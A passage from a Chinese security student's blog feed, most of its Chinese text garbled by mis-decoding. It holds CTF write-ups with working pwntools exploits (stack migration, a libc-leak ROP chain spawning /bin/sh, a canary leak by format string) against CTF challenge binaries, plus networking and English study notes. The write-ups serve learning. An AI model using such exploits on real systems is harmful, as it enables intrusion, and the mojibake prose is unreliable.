class="hljs-built_in">eip</span>-&gt;<span class="hljs-keyword">leave</span> <span class="hljs-keyword">ret</span>  <span class="hljs-built_in">esp</span>-&gt;æ¯”è¿”å›åœ°å€å†ä½<span class="hljs-number">4</span>ä¸ªå­—èŠ‚çš„ä½ç½®ä¸Š<br><span class="hljs-number">3</span>. <span class="hljs-keyword">leave</span><br><span class="hljs-built_in">esp</span>-&gt;aaaa    <span class="hljs-built_in">ebp</span> == aaaa  <span class="hljs-built_in">esp</span>-&gt;system@plt<br><span class="hljs-number">4</span>. <span class="hljs-keyword">ret</span> <br><span class="hljs-built_in">eip</span>-&gt;system@plt   <span class="hljs-built_in">esp</span>-&gt;systemçš„è¿”å›åœ°å€ï¼ˆçå†™çš„ï¼‰<br></code></pre></td></tr></table></figure><p>è¿™æ—¶ï¼Œå°±ç›¸å½“äºä¸€ä¸ªæ™®é€šçš„ropäº†ï¼Œsystem@pltä¸ºä¸€ä¸ªè¢«æº¢å‡ºçš„è¿”å›åœ°å€ï¼Œåœ¨ä»–åé¢çš„æ˜¯systemçš„è¿”å›åœ°å€å’Œå®ƒçš„å‚æ•°ï¼Œè€Œâ€/bin/sh\x00â€ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œéœ€è¦ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å®ƒï¼Œå› æ­¤éœ€è¦è®¡ç®—ä¸€ä¸‹binshçš„åœ°å€ã€‚</p><p>ç”±äºaaaaæ˜¯ebp-0x38ï¼Œbinshè·ç¦»aaaaæœ‰16ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°æ–¹å¡«ä¸Šebp-0x28ï¼Œå°±èƒ½ç»™systemä¼ è¿›å»binshçš„å‚æ•°äº†ã€‚</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&quot;./ciscn_2019_es_2&quot;</span>)<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,25391)</span><br>gdb.attach(r, <span class="hljs-string">&quot;b *0x080485FC&quot;</span>) <br>sys=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x08048562</span><br>main=<span class="hljs-number">0xdeadbeef</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x27</span>+<span class="hljs-string">&#x27;b&#x27;</span><br>r.send(payload)<br>r.recvuntil(<span class="hljs-string">&quot;b&quot;</span>)<br>ebp = u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ebp))<br><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(ebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(ebp-<span class="hljs-number">0x38</span>)+p32(leave_ret)<br><br>r.send(payload2)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="NewStarCTF-2023"><a href="#NewStarCTF-2023" class="headerlink" title="NewStarCTF 2023"></a>NewStarCTF 2<strong>023</strong></h4><p>stack migration</p><p><img src="/img/stack_migration/3.jpg"></p><p>å’Œå‰é¢çš„å”¯ä¸€åŒºåˆ«åœ¨äºéœ€è¦å…ˆæ³„éœ²libcåœ°å€ï¼Œé¢˜ç›®åˆç»™äº†libc</p><p>éœ€è¦æ³¨æ„çš„è¿˜æ˜¯ä¸è¦sendlineï¼Œå› ä¸ºä¼šå¤šä¸€ä¸ª\nï¼Œå æ‰äº†ä¸‹ä¸€æ¬¡è¾“å…¥ï¼Œpayload2å°±è¾“å…¥ä¸è¿›å»äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25029</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x4012a9&quot;)</span><br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment">#context.log_level=&quot;debug&quot;</span><br><br>leave_ret = <span class="hljs-number">0x4012aa</span><br>poprdi_ret = <span class="hljs-number">0x401333</span><br>puts_got = e.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-comment">#main = e.sym[&quot;main&quot;]</span><br>main = <span class="hljs-number">0x4012ac</span><br>start = <span class="hljs-number">0x4010b0</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;your name:\n&quot;</span>)<br>payload = <span class="hljs-string">b&quot;12345678&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;I have a small gift for you: &quot;</span>)<br>buf_addr = <span class="hljs-built_in">eval</span>(p.recv(<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(buf_addr))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;more infomation plz:\n&quot;</span>)<br>payload2 = ( p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)).ljust(<span class="hljs-number">80</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload2+= p64(buf_addr) + p64(leave_ret)<br>p.send(payload2)<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;maybe I&#x27;ll see you soon!\n&quot;</span>)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts:----&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br><br>libc = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br>libc.address =  puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;your name:\n&quot;</span>)<br>payload = <span class="hljs-string">b&quot;12345678&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;I have a small gift for you: &quot;</span>)<br>buf_addr = <span class="hljs-built_in">eval</span>(p.recv(<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(buf_addr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;more infomation plz:\n&quot;</span>)<br>payload2 = (p64(poprdi_ret) + p64(binsh) + p64(system)).ljust(<span class="hljs-number">80</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>payload2+= p64(buf_addr) + p64(leave_ret)<br>p.sendline(payload2)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>canary</title>
    <link href="/2023/10/11/ctf-pwn/canary/"/>
    <url>/2023/10/11/ctf-pwn/canary/</url>
    
    <content type="html"><![CDATA[<h3 id="canaryæ³„éœ²"><a href="#canaryæ³„éœ²" class="headerlink" title="canaryæ³„éœ²"></a>canaryæ³„éœ²</h3><p>NewStarCTF 2023 canaryï¼š</p><p><img src="/img/canary/1.jpg"></p><p><code>__readfsqword(0x28u)</code>è¯´æ˜æ·»åŠ äº†canaryï¼Œä½†æ˜¯ç¬¬ä¸€æ¬¡è¾“å…¥åªèƒ½è¾“å…¥32å­—èŠ‚ï¼Œè·ç¦»æŠŠcanaryä¸€å—printfå‡ºæ¥å·®äº†8å­—èŠ‚ï¼Œå› æ­¤ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æŠŠcanaryæ‰“å°å‡ºæ¥ã€‚</p><p><code>printf</code>çš„å‚æ•°ä¸­ï¼Œrdiä¸ºç¬¬ä¸€æ¬¡è¾“å…¥çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç„¶åéœ€è¦5ä¸ª%pæŠŠrsiï¼Œrdxï¼Œrcxï¼Œr8ï¼Œr9ç•¥è¿‡ï¼Œç„¶åå†æ¥6ä¸ª%pï¼ˆå› ä¸ºåé¢çš„å‚æ•°åœ¨æ ˆä¸Šï¼Œè€Œcanaryæ˜¯æ ˆä¸Šç¬¬41-48å­—èŠ‚ï¼Œéœ€è¦ç¬¬å…­ä¸ª%pæ‰èƒ½å°†å…¶æ‰“å°å‡ºæ¥ï¼‰</p><p>ç„¶åç¬¬äºŒæ¬¡è¾“å…¥å°±æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ropé“¾äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./canary&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28964</span>)<br>e = ELF(<span class="hljs-string">&quot;./canary&quot;</span>)<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>backdoor = e.sym[<span class="hljs-string">&quot;backdoor&quot;</span>]<br><br>payload = <span class="hljs-string">b&quot;%p%p%p%p%p%p%p%p%p%p%p&quot;</span><br><br>p.sendlineafter(<span class="hljs-string">b&quot;Give me some gift?\n&quot;</span>, payload)<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;Oh thanks,There is my gift:\n&quot;</span>)<br><br>leak = p.recvline()<br><br>canary = <span class="hljs-built_in">eval</span>(leak[-<span class="hljs-number">19</span>:-<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;Show me your magic\n&quot;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(backdoor)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wordéšå†™</title>
    <link href="/2023/10/10/ctf-misc/word%E9%9A%90%E5%86%99/"/>
    <url>/2023/10/10/ctf-misc/word%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h3 id="wordéšå†™"><a href="#wordéšå†™" class="headerlink" title="wordéšå†™"></a>wordéšå†™</h3><p>.docxæ–‡ä»¶æ”¹åç¼€ä¸º.zip</p><p>é‡Œé¢å…¨æ˜¯xmlæ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾</p><p>ç”¨vscodeæ‰“å¼€xmlæ—¶å¯ä»¥ç”¨<code>shift alt f</code>è¿›è¡Œæ ¼å¼æ•´ç†ï¼ˆéœ€è¦è£…ä¸€ä¸ªxml formatterï¼‰</p><p><img src="/img/steganography/1.jpg"></p><p>ä¾‹å¦‚ä¸Šå›¾ä¸­çš„é¢˜ç›®æ˜¯åœ¨document.xmlé‡Œæ”¾äº†ä¸€æ®µå¯†æ–‡</p><p>pptåŒç†</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®¡ç®—æœºç½‘ç»œçŸ¥è¯†è¡¥ä¹ </title>
    <link href="/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <url>/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="åè®®"><a href="#åè®®" class="headerlink" title="åè®®"></a>åè®®</h2><h3 id="Ethernet-II-å¸§"><a href="#Ethernet-II-å¸§" class="headerlink" title="Ethernet_II å¸§"></a>Ethernet_II å¸§</h3><p>14ä¸ªå­—èŠ‚</p><blockquote><p>dst MAC + src Mac + Type    =    6 + 6 + 2   =  14Bytes</p></blockquote><p>åœ¨æ•°æ®é“¾è·¯å±‚è¿˜ä¼šåœ¨æŠ¥æ–‡ç»“å°¾æ·»åŠ FCSï¼ˆå¸§æ ¡éªŒåºåˆ—ï¼‰ï¼Œ<strong>ä½†æ˜¯Wiresharké‡Œå¹¶ä¸ä¼šæŠŠä»–æ˜¾ç¤ºå‡ºæ¥</strong></p><h3 id="ARPå’ŒRARPåè®®"><a href="#ARPå’ŒRARPåè®®" class="headerlink" title="ARPå’ŒRARPåè®®"></a>ARPå’ŒRARPåè®®</h3><p>ï¼ˆReverse) Address Resolution Protocal </p><p>å°†32ä½ç½‘ç»œå±‚åœ°å€è½¬ä¸ºé“¾è·¯å±‚48ä½MACåœ°å€ï¼Œé€†åœ°å€è§£æåè®®ç›¸åã€‚</p><p>å…³äºå±äºå“ªä¸€å±‚åè®®æ¯”è¾ƒæ¨¡ç³Šï¼Œç›®å‰æ¯”è¾ƒå¤šçš„äººè®¤ä¸º:</p><blockquote><p>åœ¨tcp/ipé‡Œå±äºç½‘ç»œå±‚ï¼Œåœ¨OSIé‡Œå±äºé“¾è·¯å±‚ï¼ˆå­˜ç–‘ï¼‰</p></blockquote><p><strong>æŠ¥æ–‡æ ¼å¼ï¼š</strong></p><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/arp.jpg"></p><p>ç”±<code>Ethernet_II</code>å’Œ<code>ARP</code>ä¸¤éƒ¨åˆ†æ„æˆï¼ˆæ‰€ä»¥ä»è¿™é‡Œæ¥çœ‹è¿˜æ˜¯å½“æˆç½‘ç»œå±‚æ¯”è¾ƒå¥½ï¼‰</p><p>ARPéƒ¨åˆ†å…±28å­—èŠ‚</p><p>åŒ…æ‹¬8å­—èŠ‚çš„æŠ¥å¤´ï¼ˆç¡¬ä»¶ç±»å‹ï¼Œä¸Šå±‚åè®®ç±»å‹ï¼ŒMACåœ°å€é•¿åº¦ï¼ŒIPåœ°å€é•¿åº¦ï¼Œæ“ä½œç±»å‹ï¼‰</p><p>å‰©ä¸‹20å­—èŠ‚ä¸ºï¼šæºmacï¼ŒæºIPï¼Œç›®çš„macï¼ˆ00å¡«å……ï¼‰ï¼Œç›®çš„IP</p><p>æŸä¸ªä¸»æœºæ”¶åˆ°ä¸€ä¸ªarpå¹¿æ’­ä¹‹åï¼ŒæŸ¥çœ‹æŠ¥æ–‡é‡Œçš„IPæ˜¯ä¸æ˜¯è‡ªå·±çš„IPï¼Œå¦‚æœä¸æ˜¯å°±åªå°†å¯¹æ–¹IP/MACè®°å½•åˆ°arpè¡¨é‡Œ</p><blockquote><p>arp -a # æŸ¥çœ‹arpè¡¨</p></blockquote><p>å¦‚æœæ˜¯è‡ªå·±çš„IPï¼Œè¿”å›</p><blockquote><p>ARPåè®®åœ¨IPV6ä¸­ä¸å†ä½¿ç”¨ï¼Œå–ä»£å…¶çš„æ˜¯NDP</p></blockquote><h3 id="ICMPåè®®"><a href="#ICMPåè®®" class="headerlink" title="ICMPåè®®"></a>ICMPåè®®</h3><p>Internet Control Message Protocolï¼Œâ€ä¸»è¦ç”¨æ¥æ£€æµ‹ç½‘ç»œé€šä¿¡æ•…éšœå’Œå®ç°é“¾è·¯è¿½è¸ªâ€œ</p><p>è™½ç„¶ä»æŠ¥æ–‡æ ¼å¼æ¥çœ‹ï¼ŒICMPæŠ¥æ–‡åœ¨IPæŠ¥å¤´ä¹‹åï¼Œä½†<strong>ICMPå±äºç½‘ç»œå±‚åè®®</strong>ï¼Œå¸¸è§çš„ç”¨é€”åŒ…æ‹¬PINGå’ŒtraceRoute</p><p>ä¾‹å¦‚PINGï¼š</p><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/ICMP.jpg"></p><p> åŒ…æ‹¬8å­—èŠ‚çš„æŠ¥å¤´ï¼Œä»¥åŠåé¢çš„æŠ¥æ–‡ï¼ŒPINGçš„æŠ¥æ–‡ä¸º32ä¸ªå°å†™çš„è‹±æ–‡å­—æ¯ï¼ˆè¯·æ±‚å’Œå“åº”éƒ½æ˜¯è¿™ä¸ªç»“æ„ï¼‰</p><h3 id="å†…ç½‘IP"><a href="#å†…ç½‘IP" class="headerlink" title="å†…ç½‘IP"></a>å†…ç½‘IP</h3><p>å› ç‰¹ç½‘åˆ†é…ç¼–å·å§”å‘˜ä¼šï¼ˆIANAï¼‰ä¿ç•™äº†3å—IPåœ°å€åšä¸ºç§æœ‰IPåœ°å€ï¼š</p><p>10.0.0.0 â€”â€”â€” 10.255.255.255</p><p>172.16.0.0â€”â€”â€” 172.16.255.255</p><p>192.168.0.0â€”â€”â€”192.168.255.255</p><h3 id="NATæœºåˆ¶"><a href="#NATæœºåˆ¶" class="headerlink" title="NATæœºåˆ¶"></a>NATæœºåˆ¶</h3><p>Network Address Translation</p><p><strong>é™æ€NAT</strong>ï¼šå†…ç½‘IPä¸å…¬ç½‘IPä¸€ä¸€å¯¹åº”ï¼Œé™æ€NATä¸èƒ½å‡å°‘å…¬ç½‘IPåœ°å€çš„ä½¿ç”¨</p><p><strong>åŠ¨æ€NAT</strong>ï¼šå°†å…¬æœ‰åœ°å€æ± ä»¥å…ˆåˆ°å…ˆå¾—çš„æ–¹å¼åˆ†é…ï¼ˆå…¬ç½‘IPå°‘äºå†…ç½‘IPï¼‰</p><p>**ç«¯å£åœ°å€è½¬æ¢ï¼ˆNAPT/PAT)**ï¼šè·¯ç”±å™¨é€šè¿‡æŠ¥æ–‡çš„IPæ˜¯0~65535çš„å“ªä¸ªï¼Œå†³å®šå°†æŠ¥æ–‡å‘é€ç»™å†…ç½‘å“ªå°ä¸»æœº</p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNSè§£æï¼šUDPåè®®ï¼Œç«¯å£53</p><p>è§£æé¡ºåºï¼šæµè§ˆå™¨ç¼“å­˜ï¼Œæœ¬åœ°Hostsæ–‡ä»¶ï¼Œè·¯ç”±å™¨ç¼“å­˜ï¼Œç„¶åæ‰æ˜¯DNSæœåŠ¡å™¨è§£æï¼ˆå¾ªç¯è§£æï¼Œé€’å½’è§£æï¼‰</p><h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><p>Dynamic Host Configuration Protocolï¼ŒUDPåè®®</p><p>ç®€å•æ¥è¯´ï¼ŒDHCPå°±æ˜¯ä¸€ä¸ªä¸éœ€è¦è´¦å·å¯†ç ç™»å½•çš„ã€è‡ªåŠ¨ç»™å†…ç½‘æœºå™¨åˆ†é…IPåœ°å€ç­‰ä¿¡æ¯çš„åè®®ã€‚</p><p>åœ¨DHCPæŠ¥æ–‡å¼€å§‹ä¼šæœ‰ä¸€ä¸ªopå­—æ®µï¼ŒåŒ…æ‹¬ï¼š</p><p>è¯·æ±‚æŠ¥æ–‡ï¼šDHCP Discoverã€DHCP Requestã€DHCP Releaseã€DHCP Informå’ŒDHCP Declineã€‚<br>åº”ç­”æŠ¥æ–‡ï¼šDHCP Offerã€DHCP ACKå’ŒDHCP NAKã€‚</p><p>é¦–å…ˆå®¢æˆ·ç«¯å¹¿æ’­ï¼ˆDiscoverï¼‰ï¼Œç„¶åæœåŠ¡å™¨åº”ç­”ï¼ˆOffer)ï¼Œå®¢æˆ·ç«¯é€‰æ‹©æœ€å…ˆæ”¶åˆ°çš„offerè¿›è¡Œå¹¿æ’­ï¼ˆRequestï¼‰ï¼ŒæœåŠ¡å™¨å¯¹å…¶è¿›è¡ŒIPåœ°å€åˆ†é…ï¼ˆDHCP ACKï¼‰</p><h2 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h2><blockquote><p>ä¸ºä»€ä¹ˆè¦ç”¨å­ç½‘æ©ç ï¼Ÿ</p></blockquote><p>åˆ†ç¦»ç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€ï¼Œä¸¤å°ä¸»æœºé€šä¿¡æ—¶ï¼Œå¯¹å­ç½‘æ©ç è¿›è¡Œä¸æ“ä½œå¾—åˆ°ç½‘ç»œåœ°å€</p><p>ç½‘ç»œåœ°å€ç›¸åŒï¼Œå°±ç”¨ARPåè®®å‘ç°macåœ°å€ï¼Œå¦‚æœä¸åŒå°±å‘é€åˆ°ç½‘å…³ï¼ˆè·¯ç”±å™¨çš„IPåœ°å€ï¼‰</p><p>192.168.1.1/30 æ–œæ åé¢çš„å°±æ˜¯å­ç½‘æ©ç ï¼Œè¡¨ç¤ºæœ‰å‡ ä¸ª1ï¼Œä¾‹å¦‚24å°±æ˜¯255.255.255.0</p><blockquote><p>IPv4æ•°æ®åŒ…çš„é€‰é¡¹éƒ¨åˆ†</p></blockquote><p>å˜é•¿ã€å¯é€‰ã€‚æœ‰ä¸€ä¸ªä¸€å­—èŠ‚çš„é€‰é¡¹ç ã€‚ä¾‹å¦‚</p><p>ä¸¥æ ¼æºè·¯ç”±ï¼Œé€‰é¡¹åé¢ä¼šè·Ÿç€ä¸€ä¸ªåˆ—è¡¨ï¼Œæ•°æ®åŒ…å¿…é¡»ä¸¥æ ¼ç»è¿‡ä¸Šé¢æ‰€æœ‰è·¯ç”±å™¨</p><p>å®½æ¾æºè·¯ç”±ï¼Œåªç»™å‡ºå…³é”®ç‚¹ï¼Œå‰©ä¸‹çš„ç”±è‡ªåŠ¨è·¯ç”±é€‰æ‹©åŠŸèƒ½è¡¥å……</p><blockquote><p>å¹¿æ’­</p></blockquote><p>å—é™å¹¿æ’­ï¼šip.dst==255.255.255.255ï¼Œåªèƒ½æœ¬åœ°å¹¿æ’­ï¼Œè·¯ç”±ä¸ä¼šè½¬å‘ã€‚ï¼ˆEtherå¸§çš„dstæ˜¯ff:ff:ff:ff:ff:ffï¼‰</p><p>ç›´æ¥å¹¿æ’­ï¼šip.dstçš„ä¸»æœºåœ°å€å…¨è®¾ç½®ä¸º1ï¼Œç½‘ç»œåœ°å€åŒip.srcï¼ˆEtherçš„dstè¿˜æ˜¯6ä¸ªffï¼‰ï¼Œä¾‹å¦‚ï¼š</p><p>192.168.1.1/30å¯ä»¥å‘é€å¹¿æ’­åŒ…(192.168.1.7)ï¼Œä½¿ä¸»æœº192.168.1.5/30 ä¹Ÿå¯ä»¥æ¥æ”¶åˆ°è¯¥æ•°æ®åŒ…ï¼Œå‰ææ˜¯ä¹‹é—´çš„è·¯ç”±å™¨è¦å¼€å¯å®šå‘å¹¿æ’­åŠŸèƒ½ã€‚</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><blockquote><p>ping of death</p></blockquote><p>æ•°æ®åŒ…åˆ†ç‰‡ä¹‹åé‡ç»„ï¼Œé‡ç»„ä¹‹åç¼“å†²åŒºæº¢å‡º</p><blockquote><p>ICMP Smurf åå°„æ”¾å¤§æ”»å‡»</p></blockquote><p>ä¼ªé€ ip.srcï¼Œå¤§é‡æœºå™¨å‘è¢«æ”»å‡»ä¸»æœºè¿”å›icmp echo</p>]]></content>
    
    
    <categories>
      
      <category>å­¦ä¹ ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¡ç®—æœºç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è‹±è¯­è¯¾ç¬”è®°</title>
    <link href="/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Eng/"/>
    <url>/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Eng/</url>
    
    <content type="html"><![CDATA[<p>listening and speaking resources</p><ol><li><p><a href="http://www.ted.com/">www.ted.com</a></p></li><li><p><a href="http://www.bbc.co.uk/learningenglish">www.bbc.co.uk/learningenglish</a></p></li><li><p><a href="http://www.elllo.org/">www.elllo.org</a></p></li></ol><p>academic reading and writing resources</p><ol><li>&lt;<a href="http://www.idebate.org&gt;/">www.idebate.org&gt;</a></li><li><a href="http://www.nottingham.ac.uk/">www.nottingham.ac.uk</a></li><li>academic phrasebank <a href="http://www.phrasebank.manchester.ac.uk/">www.phrasebank.manchester.ac.uk</a></li></ol><p>vocablulary learning tools</p><ol><li><a href="http://www.dictionary.com/">www.dictionary.com</a></li><li><a href="http://www.linguee.com/">www.linguee.com</a></li><li><a href="http://www.wantwords.net/">www.wantwords.net</a></li></ol><p>corpus</p><ol><li>corpus of contemporary American English</li><li></li></ol>]]></content>
    
    
    <categories>
      
      <category>å­¦ä¹ ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è‹±è¯­</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>firmaeå®‰è£…åŠD-Link DSL-3782ä»¿çœŸ</title>
    <link href="/2023/09/14/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/firmae%E5%AE%89%E8%A3%85%E5%8F%8AD-Link%20DSL-3782%E4%BB%BF%E7%9C%9F/"/>
    <url>/2023/09/14/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/firmae%E5%AE%89%E8%A3%85%E5%8F%8AD-Link%20DSL-3782%E4%BB%BF%E7%9C%9F/</url>
    
